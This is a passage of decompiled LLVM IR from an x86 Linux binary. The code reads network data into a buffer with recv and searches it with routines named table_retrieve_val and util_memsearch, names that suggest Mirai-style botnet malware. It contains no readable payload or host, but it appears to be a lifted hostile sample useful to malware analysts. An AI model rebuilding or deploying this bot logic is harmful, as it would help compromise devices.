  %v11_804950b = xor i32 %v4_804950b, %v3_8049508
  %v12_804950b = xor i32 %v5_804950b, %v3_8049508
  %v13_804950b = and i32 %v12_804950b, %v11_804950b
  %v14_804950b = icmp slt i32 %v13_804950b, 0
  %v15_804950b = icmp eq i32 %v5_804950b, 0
  store i1 %v15_804950b, i1* %zf.global-to-local, align 1
  %v16_804950b = icmp slt i32 %v5_804950b, 0
  %v3_804950f = icmp ne i1 %v16_804950b, %v14_804950b
  %v4_804950f = or i1 %v15_804950b, %v3_804950f
  br i1 %v4_804950f, label %dec_label_pc_8048ca2, label %dec_label_pc_8048dc4

dec_label_pc_804951a:                             ; preds = %dec_label_pc_8049d7a
  %v0_804951a = load i32, i32* @ebx, align 4
  %v1_804951a = inttoptr i32 %v0_804951a to i32*
  store i32 104, i32* %v1_804951a, align 4
  br label %dec_label_pc_8049520

dec_label_pc_8049520:                             ; preds = %dec_label_pc_8049f36, %dec_label_pc_80497bd, %dec_label_pc_8048ecb, %dec_label_pc_8049dac, %dec_label_pc_8049f2a, %dec_label_pc_804951a
  %v0_8049520 = load i32, i32* @esp, align 4
  %v9_8049520 = icmp eq i32 %v0_8049520, 12
  store i1 %v9_8049520, i1* %zf.global-to-local, align 1
  %v0_8049523 = load i32, i32* @edi, align 4
  %v1_8049523 = add i32 %v0_8049523, -1452
  %v2_8049523 = inttoptr i32 %v1_8049523 to i32*
  %v3_8049523 = load i32, i32* %v2_8049523, align 4
  store i32 %v3_8049523, i32* %edx.global-to-local, align 4
  %v2_8049529 = add i32 %v0_8049520, -16
  %v3_8049529 = inttoptr i32 %v2_8049529 to i32*
  store i32 %v3_8049523, i32* %v3_8049529, align 4
  %v1_804952a = call i32 @__GI___libc_close(i32 %stack_var_-20888.0)
  store i32 %v1_804952a, i32* %eax.global-to-local, align 4
  %v0_804952f = load i32, i32* @esp, align 4
  %v6_804952f = icmp eq i32 %v0_804952f, -16
  store i1 %v6_804952f, i1* %zf.global-to-local, align 1
  %v0_8049532 = load i32, i32* @edi, align 4
  %v1_8049532 = add i32 %v0_8049532, -1452
  %v2_8049532 = inttoptr i32 %v1_8049532 to i32*
  store i32 -1, i32* %v2_8049532, align 4
  %v0_804953c = load i32, i32* @edi, align 4
  %v1_804953c = add i32 %v0_804953c, -1448
  %v2_804953c = inttoptr i32 %v1_804953c to i8*
  store i8 0, i8* %v2_804953c, align 1
  br label %dec_label_pc_8048e80

dec_label_pc_8049548:                             ; preds = %dec_label_pc_8048c70
  %v2_8049548 = inttoptr i32 %v1_8048cb6 to i32*
  %v3_8049548 = load i32, i32* %v2_8049548, align 4
  %v1_804954d = urem i32 %v3_8049548, 32
  store i32 %v1_804954d, i32* %eax.global-to-local, align 4
  %v2_8049550 = udiv i32 %v3_8049548, 32
  store i32 %v2_8049550, i32* %edx.global-to-local, align 4
  %v0_8049553 = load i32, i32* @esp, align 4
  %v2_8049553 = mul nuw nsw i32 %v2_8049550, 4
  %v3_8049553 = add nuw nsw i32 %v2_8049553, 20740
  %v4_8049553 = add i32 %v3_8049553, %v0_8049553
  %v5_8049553 = inttoptr i32 %v4_8049553 to i32*
  %v6_8049553 = load i32, i32* %v5_8049553, align 4
  %v9_8049553 = shl i32 1, %v1_804954d
  %v12_8049553 = or i32 %v6_8049553, %v9_8049553
  store i32 %v12_8049553, i32* %v5_8049553, align 4
  %v0_804955b = load i32, i32* @esi, align 4
  %v1_804955b = add i32 %v0_804955b, -16
  %v2_804955b = inttoptr i32 %v1_804955b to i32*
  %v3_804955b = load i32, i32* %v2_804955b, align 4
  store i32 %v3_804955b, i32* %eax.global-to-local, align 4
  %v1_804955e = load i32, i32* @esp, align 4
  %v2_804955e = add i32 %v1_804955e, 92
  %v3_804955e = inttoptr i32 %v2_804955e to i32*
  %v4_804955e = load i32, i32* %v3_804955e, align 4
  %v5_804955e = sub i32 %v3_804955b, %v4_804955e
  %v11_804955e = xor i32 %v4_804955e, %v3_804955b
  %v12_804955e = xor i32 %v5_804955e, %v3_804955b
  %v13_804955e = and i32 %v12_804955e, %v11_804955e
  %v14_804955e = icmp slt i32 %v13_804955e, 0
  %v15_804955e = icmp eq i32 %v5_804955e, 0
  store i1 %v15_804955e, i1* %zf.global-to-local, align 1
  %v16_804955e = icmp slt i32 %v5_804955e, 0
  %v3_8049562 = icmp ne i1 %v16_804955e, %v14_804955e
  %v4_8049562 = or i1 %v15_804955e, %v3_8049562
  br i1 %v4_8049562, label %dec_label_pc_8048ca2, label %dec_label_pc_8048dc4

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8048e6d
  %v2_804956d = call i32 @__GI___errno_location(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  store i32 %v2_804956d, i32* %eax.global-to-local, align 4
  %v0_8049572 = load i32, i32* @esp, align 4
  %v1_8049572 = add i32 %v0_8049572, 96
  %v2_8049572 = inttoptr i32 %v1_8049572 to i32*
  %v3_8049572 = load i32, i32* %v2_8049572, align 4
  %v1_8049576 = add i32 %v3_8049572, 2116
  store i32 %v1_8049576, i32* @esi, align 4
  %v1_804957c = add i32 %v3_8049572, 2180
  store i32 %v1_804957c, i32* %edx.global-to-local, align 4
  store i32 %v2_804956d, i32* @ebp, align 4
  %v2_8049584 = add i32 %v0_8049572, 28
  %v3_8049584 = inttoptr i32 %v2_8049584 to i32*
  store i32 %v1_804957c, i32* %v3_8049584, align 4
  %v0_8049588 = load i32, i32* @edi, align 4
  %v1_8049588 = add i32 %v0_8049588, 660
  %v2_8049588 = inttoptr i32 %v1_8049588 to i32*
  %v3_8049588 = load i32, i32* %v2_8049588, align 4
  %v9_8049588 = icmp eq i32 %v3_8049588, 1024
  store i1 %v9_8049588, i1* %zf.global-to-local, align 1
  br i1 %v9_8049588, label %dec_label_pc_804968d, label %dec_label_pc_8049598

dec_label_pc_8049598:                             ; preds = %dec_label_pc_804956d, %dec_label_pc_804968d, %dec_label_pc_804967d
  %v0_8049598 = load i32, i32* @ebp, align 4
  %v1_8049598 = inttoptr i32 %v0_8049598 to i32*
  store i32 0, i32* %v1_8049598, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_80495a4 = load i32, i32* @edi, align 4
  %v1_80495a4 = add i32 %v0_80495a4, 660
  %v2_80495a4 = inttoptr i32 %v1_80495a4 to i32*
  %v3_80495a4 = load i32, i32* %v2_80495a4, align 4
  store i32 %v3_80495a4, i32* %edx.global-to-local, align 4
  %v0_80495aa = load i32, i32* @esp, align 4
  %v1_80495aa = add i32 %v0_80495aa, -4
  %v2_80495aa = inttoptr i32 %v1_80495aa to i32*
  store i32 16384, i32* %v2_80495aa, align 4
  %v0_80495af = load i32, i32* %eax.global-to-local, align 4
  %v1_80495af = load i32, i32* %edx.global-to-local, align 4
  %v2_80495af = sub i32 %v0_80495af, %v1_80495af
  %v12_80495af = icmp eq i32 %v2_80495af, 0
  store i1 %v12_80495af, i1* %zf.global-to-local, align 1
  store i32 %v2_80495af, i32* %eax.global-to-local, align 4
  %v0_80495b1 = load i32, i32* @esi, align 4
  %v2_80495b1 = add i32 %v0_80495b1, %v1_80495af
  store i32 %v2_80495b1, i32* %edx.global-to-local, align 4
  %v2_80495b4 = add i32 %v0_80495aa, -8
  %v3_80495b4 = inttoptr i32 %v2_80495b4 to i32*
  store i32 %v2_80495af, i32* %v3_80495b4, align 4
  %v0_80495b5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80495b5 = add i32 %v0_80495aa, -12
  %v3_80495b5 = inttoptr i32 %v2_80495b5 to i32*
  store i32 %v0_80495b5, i32* %v3_80495b5, align 4
  %v0_80495b6 = load i32, i32* @edi, align 4
  %v1_80495b6 = add i32 %v0_80495b6, -1452
  %v2_80495b6 = inttoptr i32 %v1_80495b6 to i32*
  %v3_80495b6 = load i32, i32* %v2_80495b6, align 4
  store i32 %v3_80495b6, i32* %ecx.global-to-local, align 4
  %v2_80495bc = add i32 %v0_80495aa, -16
  %v3_80495bc = inttoptr i32 %v2_80495bc to i32*
  store i32 %v3_80495b6, i32* %v3_80495bc, align 4
  %v0_80495bd = call i32 @__libc_recv()
  store i32 %v0_80495bd, i32* @eax, align 4
  %v0_80495c2 = load i32, i32* @esp, align 4
  %v1_80495c5 = icmp eq i32 %v0_80495bd, 0
  store i1 %v1_80495c5, i1* %zf.global-to-local, align 1
  br i1 %v1_80495c5, label %dec_label_pc_8049f2a, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049598
  %v10_80495cd = icmp eq i32 %v0_80495bd, -1
  store i1 %v10_80495cd, i1* %zf.global-to-local, align 1
  br i1 %v10_80495cd, label %dec_label_pc_8049f36, label %dec_label_pc_80495d6

dec_label_pc_80495d6:                             ; preds = %dec_label_pc_80495cd
  %v0_80495d6 = load i32, i32* @edi, align 4
  %v1_80495d6 = add i32 %v0_80495d6, 660
  %v2_80495d6 = inttoptr i32 %v1_80495d6 to i32*
  %v3_80495d6 = load i32, i32* %v2_80495d6, align 4
  store i32 %v3_80495d6, i32* %edx.global-to-local, align 4
  %v1_80495dc = add i32 %v0_80495c2, 72
  %v2_80495dc = inttoptr i32 %v1_80495dc to i32*
  %v3_80495dc = load i32, i32* %v2_80495dc, align 4
  store i32 %v3_80495dc, i32* @ecx, align 4
  %v2_80495e0 = add i32 %v3_80495d6, %v0_80495bd
  %v12_80495e0 = icmp eq i32 %v2_80495e0, 0
  store i1 %v12_80495e0, i1* %zf.global-to-local, align 1
  store i32 %v2_80495e0, i32* @edx, align 4
  %v2_80495e2 = add i32 %v0_80495d6, -1444
  %v3_80495e2 = inttoptr i32 %v2_80495e2 to i32*
  store i32 %v3_80495dc, i32* %v3_80495e2, align 4
  %v0_80495e8 = load i32, i32* @edx, align 4
  %v1_80495e8 = load i32, i32* @edi, align 4
  %v2_80495e8 = add i32 %v1_80495e8, 660
  %v3_80495e8 = inttoptr i32 %v2_80495e8 to i32*
  store i32 %v0_80495e8, i32* %v3_80495e8, align 4
  br label %dec_label_pc_8049662

dec_label_pc_80495f0:                             ; preds = %dec_label_pc_8049662
  %v1_80495f0 = add i32 %v0_8049662, 660
  %v2_80495f0 = inttoptr i32 %v1_80495f0 to i32*
  %v3_80495f0 = load i32, i32* %v2_80495f0, align 4
  store i32 %v3_80495f0, i32* @ebx, align 4
  %v2_80495f6 = sub i32 %v3_80495f0, %v3_8049662
  %v8_80495f6 = xor i32 %v3_80495f0, %v3_8049662
  %v9_80495f6 = xor i32 %v2_80495f6, %v3_80495f0
  %v10_80495f6 = and i32 %v9_80495f6, %v8_80495f6
  %v11_80495f6 = icmp slt i32 %v10_80495f6, 0
  %v12_80495f6 = icmp eq i32 %v2_80495f6, 0
  store i1 %v12_80495f6, i1* %zf.global-to-local, align 1
  %v13_80495f6 = icmp slt i32 %v2_80495f6, 0
  %v3_80495f8 = icmp ne i1 %v13_80495f6, %v11_80495f6
  %v4_80495f8 = or i1 %v12_80495f6, %v3_80495f8
  br i1 %v4_80495f8, label %dec_label_pc_80495fc, label %dec_label_pc_80495fa

dec_label_pc_80495fa:                             ; preds = %dec_label_pc_80495f0
  store i32 %v3_8049662, i32* @ebx, align 4
  br label %dec_label_pc_80495fc

dec_label_pc_80495fc:                             ; preds = %dec_label_pc_80495f0, %dec_label_pc_80495fa
  %v1_80495fc = phi i32 [ %v3_80495f0, %dec_label_pc_80495f0 ], [ %v3_8049662, %dec_label_pc_80495fa ]
  %v2_80495fc = sub i32 %v3_8049662, %v1_80495fc
  store i32 %v2_80495fc, i32* %eax.global-to-local, align 4
  %v1_80495fe = inttoptr i32 %v0_8049662 to i32*
  %v2_80495fe = load i32, i32* %v1_80495fe, align 4
  %v11_80495fe = icmp eq i32 %v2_80495fe, 1
  store i1 %v11_80495fe, i1* %zf.global-to-local, align 1
  store i32 %v2_80495fc, i32* %v2_8049662, align 4
  %v0_80496b5 = load i32, i32* %eax.global-to-local, align 4
  br i1 %v11_80495fe, label %dec_label_pc_80496b5, label %dec_label_pc_804960a

dec_label_pc_804960a:                             ; preds = %dec_label_pc_80495fc, %dec_label_pc_80496da, %dec_label_pc_8049669
  %v0_804960a = phi i32 [ %v3_80496da, %dec_label_pc_80496da ], [ %v3_8049662, %dec_label_pc_8049669 ], [ %v0_80496b5, %dec_label_pc_80495fc ]
  %v1_804960a = icmp eq i32 %v0_804960a, 0
  store i1 %v1_804960a, i1* %zf.global-to-local, align 1
  %v1_804960c = icmp eq i1 %v1_804960a, false
  br i1 %v1_804960c, label %dec_label_pc_804962b, label %dec_label_pc_804960e

dec_label_pc_804960e:                             ; preds = %dec_label_pc_804960a
  %v0_804960e = load i32, i32* @edi, align 4
  %v1_804960e = add i32 %v0_804960e, 8
  %v2_804960e = inttoptr i32 %v1_804960e to i32*
  %v3_804960e = load i32, i32* %v2_804960e, align 4
  %v12_804960e = icmp eq i32 %v3_804960e, 1
  store i1 %v12_804960e, i1* %zf.global-to-local, align 1
  br i1 %v12_804960e, label %dec_label_pc_80496e2, label %dec_label_pc_8049618

dec_label_pc_8049618:                             ; preds = %dec_label_pc_804960e
  %v1_8049618 = add i32 %v0_804960e, 660
  %v2_8049618 = inttoptr i32 %v1_8049618 to i32*
  %v3_8049618 = load i32, i32* %v2_8049618, align 4
  %v1_804961e = load i32, i32* @ebx, align 4
  %v2_804961e = sub i32 %v3_8049618, %v1_804961e
  store i32 %v2_804961e, i32* %eax.global-to-local, align 4
  %v2_8049620 = add i32 %v0_804960e, 12
  %v3_8049620 = inttoptr i32 %v2_8049620 to i32*
  store i32 %v2_804961e, i32* %v3_8049620, align 4
  %v0_8049623 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049623 = icmp eq i32 %v0_8049623, 0
  store i1 %v1_8049623, i1* %zf.global-to-local, align 1
  br i1 %v1_8049623, label %dec_label_pc_8049d67, label %dec_label_pc_804962b

dec_label_pc_804962b:                             ; preds = %dec_label_pc_80496e2, %dec_label_pc_8049618, %dec_label_pc_804960a, %dec_label_pc_8049768
  %v0_804962b = load i32, i32* @ebx, align 4
  %v1_804962b = icmp eq i32 %v0_804962b, 0
  store i1 %v1_804962b, i1* %zf.global-to-local, align 1
  br i1 %v1_804962b, label %dec_label_pc_8049670, label %dec_label_pc_804962f

dec_label_pc_804962f:                             ; preds = %dec_label_pc_804962b
  %v0_804962f = load i32, i32* @edi, align 4
  %v1_804962f = add i32 %v0_804962f, 660
  %v2_804962f = inttoptr i32 %v1_804962f to i32*
  %v3_804962f = load i32, i32* %v2_804962f, align 4
  %v2_8049635 = sub i32 %v3_804962f, %v0_804962b
  %v12_8049635 = icmp eq i32 %v2_8049635, 0
  store i1 %v12_8049635, i1* %zf.global-to-local, align 1
  store i32 %v2_8049635, i32* %eax.global-to-local, align 4
  store i32 %v2_8049635, i32* %v2_804962f, align 4
  %v0_804963d = load i32, i32* @edx, align 4
  %v1_804963d = load i32, i32* @esp, align 4
  %v2_804963d = add i32 %v1_804963d, -4
  %v3_804963d = inttoptr i32 %v2_804963d to i32*
  store i32 %v0_804963d, i32* %v3_804963d, align 4
  %v0_804963e = load i32, i32* %eax.global-to-local, align 4
  %v2_804963e = add i32 %v1_804963d, -8
  %v3_804963e = inttoptr i32 %v2_804963e to i32*
  store i32 %v0_804963e, i32* %v3_804963e, align 4
  %v0_804963f = load i32, i32* @esi, align 4
  %v1_804963f = load i32, i32* @ebx, align 4
  %v2_804963f = add i32 %v1_804963f, %v0_804963f
  store i32 %v2_804963f, i32* %eax.global-to-local, align 4
  %v2_8049642 = add i32 %v1_804963d, -12
  %v3_8049642 = inttoptr i32 %v2_8049642 to i32*
  store i32 %v2_804963f, i32* %v3_8049642, align 4
  %v0_8049643 = load i32, i32* @esi, align 4
  %v2_8049643 = add i32 %v1_804963d, -16
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v0_8049643, i32* %v3_8049643, align 4
  %v4_8049644 = call i32 @memmove(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049644, i32* %eax.global-to-local, align 4
  %v0_8049649 = load i32, i32* @edi, align 4
  %v1_8049649 = add i32 %v0_8049649, 660
  %v2_8049649 = inttoptr i32 %v1_8049649 to i32*
  %v3_8049649 = load i32, i32* %v2_8049649, align 4
  store i32 %v3_8049649, i32* %eax.global-to-local, align 4
  %v0_804964f = load i32, i32* @esp, align 4
  %v1_804964f = add i32 %v0_804964f, 112
  %v2_804964f = inttoptr i32 %v1_804964f to i32*
  %v3_804964f = load i32, i32* %v2_804964f, align 4
  store i32 %v3_804964f, i32* @ecx, align 4
  %v1_8049656 = icmp eq i32 %v3_8049649, 0
  store i1 %v1_8049656, i1* %zf.global-to-local, align 1
  %v2_8049658 = add i32 %v3_8049649, 2116
  %v3_8049658 = add i32 %v2_8049658, %v3_804964f
  %v4_8049658 = inttoptr i32 %v3_8049658 to i8*
  store i8 0, i8* %v4_8049658, align 1
  %v0_8049660 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8049660, label %dec_label_pc_8049670, label %dec_label_pc_8049662

dec_label_pc_8049662:                             ; preds = %dec_label_pc_804962f, %dec_label_pc_80495d6
  %v0_8049662 = load i32, i32* @edi, align 4
  %v1_8049662 = add i32 %v0_8049662, 12
  %v2_8049662 = inttoptr i32 %v1_8049662 to i32*
  %v3_8049662 = load i32, i32* %v2_8049662, align 4
  store i32 %v3_8049662, i32* %eax.global-to-local, align 4
  %v1_8049665 = icmp eq i32 %v3_8049662, 0
  store i1 %v1_8049665, i1* %zf.global-to-local, align 1
  %tmp124 = icmp slt i32 %v3_8049662, 1
  %tmp125 = icmp eq i1 %tmp124, false
  br i1 %tmp125, label %dec_label_pc_80495f0, label %dec_label_pc_8049669

dec_label_pc_8049669:                             ; preds = %dec_label_pc_8049662
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804960a

dec_label_pc_8049670:                             ; preds = %dec_label_pc_804962f, %dec_label_pc_804962b
  %v0_8049670 = load i32, i32* @edi, align 4
  %v1_8049670 = add i32 %v0_8049670, -1448
  %v2_8049670 = inttoptr i32 %v1_8049670 to i8*
  %v3_8049670 = load i8, i8* %v2_8049670, align 1
  %v12_8049670 = icmp eq i8 %v3_8049670, 7
  store i1 %v12_8049670, i1* %zf.global-to-local, align 1
  %v1_8049677 = icmp eq i1 %v12_8049670, false
  br i1 %v1_8049677, label %dec_label_pc_8048e80, label %dec_label_pc_804967d

dec_label_pc_804967d:                             ; preds = %dec_label_pc_8049670
  %v1_804967d = add i32 %v0_8049670, 660
  %v2_804967d = inttoptr i32 %v1_804967d to i32*
  %v3_804967d = load i32, i32* %v2_804967d, align 4
  %v9_804967d = icmp eq i32 %v3_804967d, 1024
  store i1 %v9_804967d, i1* %zf.global-to-local, align 1
  %v1_8049687 = icmp eq i1 %v9_804967d, false
  br i1 %v1_8049687, label %dec_label_pc_8049598, label %dec_label_pc_804968d

dec_label_pc_804968d:                             ; preds = %dec_label_pc_804967d, %dec_label_pc_804956d
  %v0_804968d = load i32, i32* %eax.global-to-local, align 4
  %v1_804968d = load i32, i32* @esp, align 4
  %v2_804968d = add i32 %v1_804968d, -4
  %v3_804968d = inttoptr i32 %v2_804968d to i32*
  store i32 %v0_804968d, i32* %v3_804968d, align 4
  %v1_804968e = add i32 %v1_804968d, -8
  %v2_804968e = inttoptr i32 %v1_804968e to i32*
  store i32 960, i32* %v2_804968e, align 4
  %v1_8049693 = add i32 %v1_804968d, 28
  %v2_8049693 = inttoptr i32 %v1_8049693 to i32*
  %v3_8049693 = load i32, i32* %v2_8049693, align 4
  store i32 %v3_8049693, i32* %eax.global-to-local, align 4
  %v2_8049697 = add i32 %v1_804968d, -12
  %v3_8049697 = inttoptr i32 %v2_8049697 to i32*
  store i32 %v3_8049693, i32* %v3_8049697, align 4
  %v0_8049698 = load i32, i32* @esi, align 4
  %v2_8049698 = add i32 %v1_804968d, -16
  %v3_8049698 = inttoptr i32 %v2_8049698 to i32*
  store i32 %v0_8049698, i32* %v3_8049698, align 4
  %v4_8049699 = call i32 @memmove(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049699, i32* %eax.global-to-local, align 4
  %v0_804969e = load i32, i32* @edi, align 4
  %v1_804969e = add i32 %v0_804969e, 660
  %v2_804969e = inttoptr i32 %v1_804969e to i32*
  %v3_804969e = load i32, i32* %v2_804969e, align 4
  %v1_80496a4 = add i32 %v3_804969e, -64
  store i32 %v1_80496a4, i32* @ebx, align 4
  %v0_80496a7 = load i32, i32* @esp, align 4
  %v6_80496a7 = icmp eq i32 %v0_80496a7, -16
  store i1 %v6_80496a7, i1* %zf.global-to-local, align 1
  store i32 %v1_80496a4, i32* %v2_804969e, align 4
  br label %dec_label_pc_8049598

dec_label_pc_80496b5:                             ; preds = %dec_label_pc_80495fc
  %v1_80496b5 = load i32, i32* @esp, align 4
  %v2_80496b5 = add i32 %v1_80496b5, -4
  %v3_80496b5 = inttoptr i32 %v2_80496b5 to i32*
  store i32 %v0_80496b5, i32* %v3_80496b5, align 4
  %v0_80496b6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80496b6 = add i32 %v1_80496b5, -8
  %v3_80496b6 = inttoptr i32 %v2_80496b6 to i32*
  store i32 %v0_80496b6, i32* %v3_80496b6, align 4
  %v1_80496b7 = add i32 %v1_80496b5, -12
  %v2_80496b7 = inttoptr i32 %v1_80496b7 to i32*
  store i32 0, i32* %v2_80496b7, align 4
  %v1_80496b9 = add i32 %v1_80496b5, -16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  store i32 43, i32* %v2_80496b9, align 4
  %v3_80496bb = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_80496bb, i32* %eax.global-to-local, align 4
  %v0_80496c0 = load i32, i32* @esp, align 4
  %v1_80496c0 = add i32 %v0_80496c0, -4
  %v2_80496c0 = inttoptr i32 %v1_80496c0 to i32*
  store i32 11, i32* %v2_80496c0, align 4
  %v2_80496c2 = add i32 %v0_80496c0, -8
  %v3_80496c2 = inttoptr i32 %v2_80496c2 to i32*
  store i32 %v3_80496bb, i32* %v3_80496c2, align 4
  %v0_80496c3 = load i32, i32* @edi, align 4
  %v1_80496c3 = add i32 %v0_80496c3, 660
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %eax.global-to-local, align 4
  %v2_80496c9 = add i32 %v0_80496c0, -12
  %v3_80496c9 = inttoptr i32 %v2_80496c9 to i32*
  store i32 %v3_80496c3, i32* %v3_80496c9, align 4
  %v0_80496ca = load i32, i32* @esi, align 4
  %v2_80496ca = add i32 %v0_80496c0, -16
  %v3_80496ca = inttoptr i32 %v2_80496ca to i32*
  store i32 %v0_80496ca, i32* %v3_80496ca, align 4
  %v4_80496cb = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80496d0 = load i32, i32* @esp, align 4
  %v1_80496d3 = add i32 %v4_80496cb, 1
  %v8_80496d3 = icmp eq i32 %v1_80496d3, 0
  store i1 %v8_80496d3, i1* %zf.global-to-local, align 1
  store i32 %v1_80496d3, i32* %eax.global-to-local, align 4
  %v1_80496d4 = icmp eq i1 %v8_80496d3, false
  br i1 %v1_80496d4, label %dec_label_pc_804a1c9, label %dec_label_pc_80496da

dec_label_pc_80496da:                             ; preds = %dec_label_pc_80496b5
  %v0_80496da = load i32, i32* @edi, align 4
  %v1_80496da = add i32 %v0_80496da, 12
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  %v3_80496da = load i32, i32* %v2_80496da, align 4
  store i32 %v3_80496da, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804960a

dec_label_pc_80496e2:                             ; preds = %dec_label_pc_804960e
  %v0_80496e2 = load i32, i32* @esp, align 4
  %v1_80496e2 = add i32 %v0_80496e2, -4
  %v2_80496e2 = inttoptr i32 %v1_80496e2 to i32*
  store i32 2, i32* %v2_80496e2, align 4
  %v1_80496e4 = add i32 %v0_80496e2, -8
  %v2_80496e4 = inttoptr i32 %v1_80496e4 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_80496e4, align 4
  %v0_80496e9 = load i32, i32* @edi, align 4
  %v1_80496e9 = add i32 %v0_80496e9, 660
  %v2_80496e9 = inttoptr i32 %v1_80496e9 to i32*
  %v3_80496e9 = load i32, i32* %v2_80496e9, align 4
  store i32 %v3_80496e9, i32* %eax.global-to-local, align 4
  %v2_80496ef = add i32 %v0_80496e2, -12
  %v3_80496ef = inttoptr i32 %v2_80496ef to i32*
  store i32 %v3_80496e9, i32* %v3_80496ef, align 4
  %v0_80496f0 = load i32, i32* @esi, align 4
  %v2_80496f0 = add i32 %v0_80496e2, -16
  %v3_80496f0 = inttoptr i32 %v2_80496f0 to i32*
  store i32 %v0_80496f0, i32* %v3_80496f0, align 4
  %v4_80496f1 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80496f6 = load i32, i32* @esp, align 4
  %v1_80496f9 = add i32 %v4_80496f1, 1
  %v8_80496f9 = icmp eq i32 %v1_80496f9, 0
  store i1 %v8_80496f9, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f9, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f9, label %dec_label_pc_804962b, label %dec_label_pc_8049700

dec_label_pc_8049700:                             ; preds = %dec_label_pc_80496e2
  %v1_8049700 = add i32 %v0_80496f6, 12
  %v2_8049700 = inttoptr i32 %v1_8049700 to i32*
  store i32 2, i32* %v2_8049700, align 4
  %v1_8049702 = add i32 %v0_80496f6, 8
  %v2_8049702 = inttoptr i32 %v1_8049702 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_8049702, align 4
  %v0_8049707 = load i32, i32* @edi, align 4
  %v1_8049707 = add i32 %v0_8049707, 660
  %v2_8049707 = inttoptr i32 %v1_8049707 to i32*
  %v3_8049707 = load i32, i32* %v2_8049707, align 4
  %v2_804970d = add i32 %v0_80496f6, 4
  %v3_804970d = inttoptr i32 %v2_804970d to i32*
  store i32 %v3_8049707, i32* %v3_804970d, align 4
  %v0_804970e = load i32, i32* @esi, align 4
  %v3_804970e = inttoptr i32 %v0_80496f6 to i32*
  store i32 %v0_804970e, i32* %v3_804970e, align 4
  %v4_804970f = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804970f, i32* %eax.global-to-local, align 4
  store i32 %v4_804970f, i32* @ebx, align 4
  %v0_8049716 = load i32, i32* @esp, align 4
  %v1_8049716 = add i32 %v0_8049716, 112
  %v2_8049716 = inttoptr i32 %v1_8049716 to i32*
  %v3_8049716 = load i32, i32* %v2_8049716, align 4
  store i32 %v3_8049716, i32* %eax.global-to-local, align 4
  %v2_804971a = add i32 %v4_804970f, 2114
  %v3_804971a = add i32 %v2_804971a, %v3_8049716
  %v4_804971a = inttoptr i32 %v3_804971a to i8*
  store i8 0, i8* %v4_804971a, align 1
  %v0_8049722 = load i32, i32* @esp, align 4
  %v1_8049722 = add i32 %v0_8049722, -4
  %v2_8049722 = inttoptr i32 %v1_8049722 to i32*
  store i32 1, i32* %v2_8049722, align 4
  %v1_8049724 = add i32 %v0_8049722, -8
  %v2_8049724 = inttoptr i32 %v1_8049724 to i32*
  store i32 ptrtoint (i32* @global_var_8055869.20 to i32), i32* %v2_8049724, align 4
  %v0_8049729 = load i32, i32* @ebx, align 4
  %v2_8049729 = add i32 %v0_8049722, -12
  %v3_8049729 = inttoptr i32 %v2_8049729 to i32*
  store i32 %v0_8049729, i32* %v3_8049729, align 4
  %v0_804972a = load i32, i32* @esi, align 4
  %v2_804972a = add i32 %v0_8049722, -16
  %v3_804972a = inttoptr i32 %v2_804972a to i32*
  store i32 %v0_804972a, i32* %v3_804972a, align 4
  %v4_804972b = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049730 = load i32, i32* @esp, align 4
  %v1_8049730 = add i32 %v0_8049730, 32
  %v1_8049733 = add i32 %v4_804972b, 1
  %v8_8049733 = icmp eq i32 %v1_8049733, 0
  store i1 %v8_8049733, i1* %zf.global-to-local, align 1
  store i32 %v1_8049733, i32* @eax, align 4
  br i1 %v8_8049733, label %dec_label_pc_8049753, label %dec_label_pc_8049736

dec_label_pc_8049736:                             ; preds = %dec_label_pc_8049700
  %v1_8049736 = add i32 %v0_8049730, 28
  %v2_8049736 = inttoptr i32 %v1_8049736 to i32*
  store i32 1, i32* %v2_8049736, align 4
  %v1_8049738 = add i32 %v0_8049730, 24
  %v2_8049738 = inttoptr i32 %v1_8049738 to i32*
  store i32 ptrtoint (i32* @global_var_8055869.20 to i32), i32* %v2_8049738, align 4
  %v0_804973d = load i32, i32* @ebx, align 4
  %v2_804973d = add i32 %v0_8049730, 20
  %v3_804973d = inttoptr i32 %v2_804973d to i32*
  store i32 %v0_804973d, i32* %v3_804973d, align 4
  %v0_804973e = load i32, i32* @esi, align 4
  %v2_804973e = add i32 %v0_8049730, 16
  %v3_804973e = inttoptr i32 %v2_804973e to i32*
  store i32 %v0_804973e, i32* %v3_804973e, align 4
